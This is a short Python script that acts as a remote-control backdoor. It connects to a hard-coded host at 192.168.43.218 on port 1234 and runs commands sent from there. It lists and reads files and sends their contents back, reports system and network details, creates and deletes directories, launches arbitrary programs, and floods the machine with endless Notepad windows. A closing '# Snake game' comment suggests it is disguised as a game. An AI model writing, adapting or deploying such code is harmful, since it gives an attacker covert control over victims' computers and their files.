import socket,os,platform,subprocess
from datetime import datetime
s= socket.socket()
host = "192.168.43.218"
s.connect((host,1234))
print(f"{host} connected")
while True:
    com = s.recv(1024).decode()
    
    if com == "ls":
        ls = os.listdir()
        ls = str(ls)
        s.send(ls.encode())
    elif com == "pwd":
        pwd = os.getcwd()
        s.send(pwd.encode())
    elif com == "sys":
        sys = platform.uname()
        sys =str(sys)
        s.send(sys.encode())
    elif com == "mkdir":
        mkdir = s.recv(1024).decode()
        os.mkdir(mkdir)
    elif com == "rmdir":
        rmdir = s.recv(1024).decode()
        os.rmdir(rmdir)
    elif com == "open":
        app = s.recv(1024).decode()
        subprocess.Popen(app)
    elif com == "ch":
       chdir = s.recv(1024).decode()
       os.chdir(chdir)
    elif com == "ip":
        ip=socket.gethostbyname(socket.gethostname())
        ip = str(ip)
        s.send(ip.encode())
    elif com == "read":
        readFile = s.recv(1024).decode()
        with open(readFile,'r') as file:
            file=file.read()
            file = str(file)
            s.send(file.encode())
    elif com == "run":
        while True:
            subprocess.Popen('notepad')
    elif com == "date":
        date = datetime.now()
        date = str(date)
        s.send(date.encode())
    elif com == "wifi":
        import wifi
        s.send(wifi.subprocess.encode())

    else:
        pass
            
    
# Snake game

